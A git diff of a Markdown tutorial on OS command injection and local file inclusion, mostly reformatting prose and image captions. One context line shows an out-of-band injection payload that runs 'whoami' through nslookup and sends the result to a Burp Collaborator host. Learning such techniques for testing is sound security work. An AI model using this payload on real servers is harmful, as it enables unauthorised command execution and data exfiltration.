@@ -10,9 +10,18 @@ Jump directly to the lab writeups:
   
 ## Introduction
 
-OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.
+OS command injection, also known as **shell injection**, allows an attacker to execute operating system (OS) commands on the server hosting an application. This can lead to:
 
-<img width="781" height="440" alt="image" src="https://github.com/user-attachments/assets/e746f8d3-d2c9-4d92-a0ee-af0a08c5c006" />
+- Full compromise of the application and its data.  
+- Escalation to other parts of the hosting infrastructure.  
+- Pivoting to other systems within the organization via trust relationships.
+
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/e746f8d3-d2c9-4d92-a0ee-af0a08c5c006" width="750" alt="OS Command Injection Diagram">
+  <br>
+  <em>Figure: Overview of OS command injection showing attacker interaction with server OS</em>
+</p>
+
 
 
 # Types of Command Injection Vulnerabilities
@@ -96,12 +105,15 @@ Use a controlled server (e.g., Burp Collaborator) to detect DNS or HTTP requests
 `https://vulnerable-website/endpoint?parameter=||nslookup+\`whoami\`.burp.collaborator.address||`
 
 
-
 # Command Injection with Operators
 
-To inject an additional command to the intended one, we may use any of the following operators:
+To inject an additional command into an intended system command, attackers may leverage shell operators that control command execution flow.
 
-![image](https://github.com/user-attachments/assets/b5f941aa-bca4-4158-8d7c-b6d164258fd4)
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/b5f941aa-bca4-4158-8d7c-b6d164258fd4" width="750" alt="Command Injection Operators">
+  <br>
+  <em>Figure: Common shell operators used in command injection attacks</em>
+</p>
 
 
 
@@ -145,11 +157,23 @@ For Windows, stick to cross-platform operators like `&`, `&&`, `|`, or `||` to e
 
 
 ## Read vs. Execute Functions | Local File Inclusion (LFI)
-The most important thing to keep in mind is that some file inclusion functions only read the content of the specified files, while others also execute the specified files. Furthermore, some allow specifying remote URLs, while others only work with files local to the back-end server.
+
+The most important thing to keep in mind is that some file inclusion functions only **read** the contents of specified files, while others also **execute** them.
+
+Additionally:
+- Some functions allow specifying **remote URLs**.
+- Others restrict inclusion to **local files** on the back-end server.
+
+Understanding this distinction is critical when assessing the impact of an LFI vulnerability.
 
 ### Function Behavior
 
-![image](https://github.com/user-attachments/assets/78353fc1-8978-44f7-a5bb-676c71b39439)
+<p align="center">
+  <img src="https://github.com/user-attachments/assets/78353fc1-8978-44f7-a5bb-676c71b39439" width="800" alt="LFI Function Behavior Comparison">
+  <br>
+  <em>Figure: Comparison of file inclusion functions — read-only vs execute behavior</em>
+</p>
+
 
 
 This table shows which functions may execute files and which only read file content.
